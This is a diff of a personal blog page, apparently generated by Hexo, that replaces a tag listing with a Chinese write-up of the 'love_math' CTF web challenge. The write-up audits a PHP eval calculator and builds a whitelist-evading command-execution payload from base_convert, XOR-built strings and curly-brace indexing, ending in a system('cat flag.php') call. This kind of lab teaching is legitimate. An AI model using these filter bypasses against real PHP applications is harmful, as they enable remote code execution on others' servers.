@@ -6,17 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://v25bh145.github.io">
-  <title>Tag: 容斥 | V25bh145的小家儿~</title>
+  <title>CTF笔记-WEB攻防-08 | V25bh145的小家儿~</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="记录学习编程的过程">
-<meta property="og:type" content="website">
-<meta property="og:title" content="V25bh145的小家儿~">
-<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;tags&#x2F;%E5%AE%B9%E6%96%A5&#x2F;index.html">
+  <meta name="description" content="love_math前置知识 php代码审计 进制转换 使用进制绕过字母 使用进制绕过所有ascii字符(除1xxxxxxx开头外) 使用’{}’绕过’[]’ (数组 奇淫技巧，对开发有思路帮助)">
+<meta name="keywords" content="ctf-web,CTF笔记-WEB攻防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF笔记-WEB攻防-08">
+<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;10&#x2F;21&#x2F;ctf&#x2F;ctf%E7%AC%94%E8%AE%B0-09&#x2F;index.html">
 <meta property="og:site_name" content="V25bh145的小家儿~">
-<meta property="og:description" content="记录学习编程的过程">
+<meta property="og:description" content="love_math前置知识 php代码审计 进制转换 使用进制绕过字母 使用进制绕过所有ascii字符(除1xxxxxxx开头外) 使用’{}’绕过’[]’ (数组 奇淫技巧，对开发有思路帮助)">
 <meta property="og:locale" content="zh-cn">
+<meta property="og:updated_time" content="2020-10-31T10:27:02.609Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="V25bh145的小家儿~" type="application/atom+xml">
@@ -181,69 +183,247 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-ctf/ctf笔记-09" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/02/19/questions/Question-CF979C/" class="archive-article-date">
-        <time datetime="2020-02-19T08:10:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/02/19/questions/Question-CF979C/" target="_blank">Question-CF979C</a>
   
+    <h1 class="article-title" itemprop="name">
+      CTF笔记-WEB攻防-08
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2020/10/21/ctf/ctf%E7%AC%94%E8%AE%B0-09/" class="archive-article-date">
+        <time datetime="2020-10-21T07:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-21</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.8k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">8分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5419&page=2" target="_blank" rel="noopener">love_math</a></h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ol>
+<li>php代码审计</li>
+<li>进制转换</li>
+<li>使用进制绕过字母</li>
+<li>使用进制绕过<strong>所有ascii字符</strong>(除1xxxxxxx开头外)</li>
+<li>使用’{}’绕过’[]’ (数组 奇淫技巧，对开发有思路帮助)</li>
+</ol>
+<a id="more"></a>
+
+<h2 id="入题"><a href="#入题" class="headerlink" title="入题"></a>入题</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=761331&auto=0&height=66"></iframe>
+
+<p>进入页面即看到php代码，审计：</p>
+<h3 id="php审计"><a href="#php审计" class="headerlink" title="php审计"></a>php审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>大意</strong>：这个网站可以帮我们计算一些数学公式，其中只可以使用给出的函数，不支持除此以外的任何字母组合，只支持数字。</p>
+<p>属于webshell类型的题目，需要我们找出可以绕过的漏洞。</p>
+<h3 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h3><p>在题目给出的网站中翻找时，看到了一个进制转换函数，突然想到高进制的数字是使用字母表示的，立刻去试了试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=base_convert(35,10,36)</span><br><span class="line"></span><br><span class="line">output=&gt;z</span><br></pre></td></tr></table></figure>
+
+<p>不错，找到了输入字母的方法。</p>
+<p>之后我们需要找到调用php其他函数的方法，通过system函数来获取webshell。</p>
+<h2 id="尝试构造"><a href="#尝试构造" class="headerlink" title="尝试构造"></a>尝试构造</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标函数：system(&quot;cat flag.php&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="技巧1：-执行以变量为函数名的函数"><a href="#技巧1：-执行以变量为函数名的函数" class="headerlink" title="技巧1： 执行以变量为函数名的函数"></a>技巧1： 执行以变量为函数名的函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span> <span class="params">($var)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $var;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="string">"func"</span>;</span><br><span class="line">$c(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>有一点要说明的是，对于echo函数，由于echo的原本形式是不加括号的，所以行不通。</p>
+</blockquote>
+<h3 id="技巧2：-执行以函数执行结果为函数名的函数"><a href="#技巧2：-执行以函数执行结果为函数名的函数" class="headerlink" title="技巧2： 执行以函数执行结果为函数名的函数"></a>技巧2： 执行以函数执行结果为函数名的函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span> <span class="params">($var)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $var;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo base_convert("func", 36, 10); =&gt; 739560</span></span><br><span class="line">base_convert(<span class="number">739560</span>, <span class="number">10</span>, <span class="number">36</span>)(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>尝试-构造payload</p>
+</blockquote>
+<p>目标中含有空格和’.’，没有办法使用以上两条技巧构造，我们还需要构造出全部字符。</p>
+<h3 id="技巧3：只用数字，进制函数与运算符-异或-构造出所有字符-gt-异或构造的要求-重点"><a href="#技巧3：只用数字，进制函数与运算符-异或-构造出所有字符-gt-异或构造的要求-重点" class="headerlink" title="技巧3：只用数字，进制函数与运算符[异或]构造出所有字符 =&gt; 异或构造的要求(重点)"></a>技巧3：只用数字，进制函数与运算符[异或]构造出所有字符 =&gt; 异或构造的要求(重点)</h3><p>这里先放出异或的规则：</p>
+<blockquote>
+<p>在php中对两个字符串进行异或运算时：</p>
+<p><strong>运算符会先将字符串全部通过ascii表转换为二进制再进行异或，将异或的结果再重新通过ascii表转换为字符串。</strong></p>
+</blockquote>
+<p>因此，理论上我们可以通过字母与数字来构造出ascii的所有字符。</p>
+<p>再放上写好了的转换函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2ascii</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $str = mb_convert_encoding($str, <span class="string">'GB2312'</span>);</span><br><span class="line">    $change_after = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++) &#123;</span><br><span class="line">        $temp_str = str_pad(base_convert(ord($str[$i]), <span class="number">10</span>, <span class="number">2</span>), <span class="number">8</span>, <span class="number">0</span>, STR_PAD_LEFT);</span><br><span class="line">        $change_after = $change_after.$temp_str.<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> strtoupper($change_after);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="e-g-尝试转换flag-php-练习"><a href="#e-g-尝试转换flag-php-练习" class="headerlink" title="e.g:尝试转换flag.php(练习)"></a>e.g:尝试转换flag.php(练习)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> str2ascii(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="comment">// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000</span></span><br></pre></td></tr></table></figure>
+
+<p>这时直接强行使用数字和字母构造当然是不可行的，因为PHP处理输入的字符串，稍微总结了下规则：</p>
+<blockquote>
+<p>在PHP中异或构造的要求：</p>
+</blockquote>
+<blockquote>
+<ol>
+<li>必须只使用数字/字母构造(范围：<code>0: 0011 0000 9: 0011 1010</code> <code>a: 0110 0001 z: 0111 1010</code>)</li>
+<li>单个组合必须需要出现字母(在之后会使用进制转换函数构造)，不能出现纯数字的字符串。</li>
+<li>字符串的开头不能是0(譬如说，1就可以)。</li>
+</ol>
+</blockquote>
+<p>我们先尝试第一次构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000</span><br><span class="line"></span><br><span class="line">// 00110001 00110000 00110000 00110000 ******** ******** 00110000 ******** //num-two</span><br><span class="line">// 01010111 01011100 01010001 01010111 ******** ******** 01011000 ********</span><br></pre></td></tr></table></figure>
+
+<p>其中*为不能构造的部分，这是就要考虑使用三次异或了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000</span><br><span class="line"></span><br><span class="line">// 00110001 00110000 00110000 00110000 ******** 00110000 00110000 00110000 //three</span><br><span class="line">// 00110001 00110000 00110000 00110000 ******** 00110000 00110000 00110000</span><br><span class="line">// 01100110 01101100 01100001 01100111 ******** 01110000 01101000 01110000</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，如果需要的字符串为大多数为字符构成，使用三次构造明显更加方便(前两次中都使用相同的字符，可以使前两次的异或结果为0，这是的结果值就等于第三次中的字符)</p>
+<p>这时再试着构造‘.’的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//00101110 &apos;.&apos;</span><br><span class="line"></span><br><span class="line">//00110000 &apos;0&apos;</span><br><span class="line">//01110001 &apos;q&apos;</span><br><span class="line"></span><br><span class="line">//01000001 &lt;=</span><br><span class="line">//01101111 &apos;o&apos;</span><br></pre></td></tr></table></figure>
+
+<p>将字符随便组合一下，使其满足<code>PHP异或构造的要求</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000</span><br><span class="line"></span><br><span class="line">// 00110001 00110000 00110000 00110000 01101111 00110000 00110000 00110000</span><br><span class="line">//1000o000</span><br><span class="line">// 00110001 00110000 00110000 00110000 01110001 00110000 00110000 00110000</span><br><span class="line">//1000q000</span><br><span class="line">// 01100110 01101100 01100001 01100111 00110000 01110000 01101000 01110000</span><br><span class="line">//flag0php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="number">78365283840</span>, <span class="number">10</span>, <span class="number">36</span>)^base_convert(<span class="number">78365377152</span>, <span class="number">10</span>, <span class="number">36</span>)^base_convert(<span class="number">1221806459149</span>, <span class="number">10</span>, <span class="number">36</span>);</span><br></pre></td></tr></table></figure>
+
+<p>问题来了，输入超限了(可以回去看源代码，有对输入的字符串长度做限制)…</p>
+<p>因此掌握了异或构造还不行，还需要其他的知识。</p>
+<h3 id="技巧4：-使用-绕过"><a href="#技巧4：-使用-绕过" class="headerlink" title="技巧4： 使用{}绕过[]"></a>技巧4： 使用{}绕过[]</h3><blockquote>
+<p>可以用{}来访问下标</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$p = [<span class="string">"example1"</span>, <span class="string">"example2"</span>];</span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line">$p2 = [<span class="string">"key1"</span> =&gt; <span class="string">"example1"</span>, <span class="string">"key2"</span> =&gt; <span class="string">"example2"</span>];</span><br><span class="line">$i2 = <span class="string">"key1"</span>;</span><br><span class="line"><span class="comment">//以下四个echo均会输出example1</span></span><br><span class="line"><span class="keyword">echo</span> $p&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> $p&#123;$i&#125;;</span><br><span class="line"><span class="keyword">echo</span> $p2&#123;<span class="string">"key1"</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> $p2&#123;$i2&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><code>甚至以下8个都是等效的:</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$p = [<span class="string">"example1"</span>, <span class="string">"example2"</span>];</span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line">$p2 = [<span class="string">"key1"</span> =&gt; <span class="string">"example1"</span>, <span class="string">"key2"</span> =&gt; <span class="string">"example2"</span>];</span><br><span class="line">$i2 = <span class="string">"key1"</span>;</span><br><span class="line">$arr_name = <span class="string">"p"</span>;</span><br><span class="line">$arr_name2 = <span class="string">"p2"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;1:"</span>.$p&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;2:"</span>.$p&#123;$i&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;3:"</span>.$p2&#123;<span class="string">"key1"</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;4:"</span>.$p2&#123;$i2&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;5:"</span>.$&#123;$arr_name&#125;&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;6:"</span>.$&#123;$arr_name&#125;&#123;$i&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;7:"</span>.$&#123;$arr_name2&#125;&#123;<span class="string">"key1"</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;8:"</span>.$&#123;$arr_name2&#125;&#123;$i2&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="最终的paylode思路-缩小-GET-“c”-长度的-折-磨-过程"><a href="#最终的paylode思路-缩小-GET-“c”-长度的-折-磨-过程" class="headerlink" title="最终的paylode思路(缩小$_GET[“c”]长度的  折  磨  过程)"></a>最终的paylode思路(缩小$_GET[“c”]长度的  折  磨  过程)</h2><blockquote>
+<p>我们可以通过访问$_GET[]数组来实现字母的输入，使用<code>?0=system&amp;1=cat+flag.php&amp;c=\$\_GET{0}(\$\_GET{1})</code>来实现</p>
+</blockquote>
+<p>其中，_GET可以使用上述的异或构造方式来构造。</p>
+<p><strong>_GET payload</strong></p>
+<figure class="highlight plain"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 0: 0011 0000 9: 0011 1010</span><br><span class="line">// a: 0110 0001 z: 0111 1010</span><br><span class="line"></span><br><span class="line">GET TO ascii:</span><br><span class="line">01011111 01000111 01000101 01010100</span><br><span class="line"></span><br><span class="line">TWO:</span><br><span class="line">00110001 00110000 00110000 00110000</span><br><span class="line">1        0        0        0</span><br><span class="line">01101110 01110111 01110101 01100100</span><br><span class="line">n        w        u        d</span><br><span class="line"></span><br><span class="line">PAYLOAD:</span><br><span class="line">00110001 01110111 00110000 00110000</span><br><span class="line">1        w        0        0</span><br><span class="line">01101110 00110000 01110101 01100100</span><br><span class="line">n        0        u        d</span><br><span class="line"></span><br><span class="line">base_convert(&quot;1w00&quot;, 36, 2);</span><br><span class="line">10101100001000000 </span><br><span class="line">base_convert(&quot;n0ud&quot;, 36, 2);</span><br><span class="line">100000110010000000101</span><br><span class="line"></span><br><span class="line">base_convert(&quot;10101100001000000&quot;, 2, 36)^base_convert(&quot;100000110010000000101&quot;, 2, 36);</span><br><span class="line"></span><br><span class="line">$&#123;base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36)&#125;&#123;0&#125;($&#123;base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36)&#125;&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>双超出长度限制…这时可以用<code>变量</code>替换一波，<code>我们注意到字母会被屏蔽，但是关键字不会被屏蔽，所以我们可以用关键字做变量名(php中关键字名可以做变量名，只要有’$‘即可)</code>，省下一倍字符:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$p=base_convert(&quot;10101100001000000&quot;, 2, 36)^base_convert(&quot;100000110010000000101&quot;, 2, 36);$&#123;$p&#125;&#123;0&#125;($&#123;$p&#125;&#123;1&#125;);</span><br><span class="line"></span><br><span class="line">?0=system&amp;1=cat+flag.php&amp;c=$pi=base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>还是太长了…可以再选择输入十进制而不是二进制:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base_convert(&quot;1w00&quot;, 36, 10);</span><br><span class="line">88128</span><br><span class="line">base_convert(&quot;n0ud&quot;, 36, 10);</span><br><span class="line">1074181</span><br><span class="line"></span><br><span class="line">?0=system&amp;1=cat+flag.php&amp;c=$pi=base_convert(88128,10,36)^base_convert(1074181,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>终于成功了awa，这题真的是各种巧妙的绕过啊。</p>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          v25bh145
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://v25bh145.github.io/2020/10/21/ctf/ctf笔记-09/" title="CTF笔记-WEB攻防-08" target="_blank">https://v25bh145.github.io/2020/10/21/ctf/ctf笔记-09/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">容斥</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">搜索</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+    
 
     
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2020/10/21/ctf/ctf%E7%AC%94%E8%AE%B0-08/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CTF笔记-WEB攻防-08</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
           </div>
@@ -284,9 +464,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
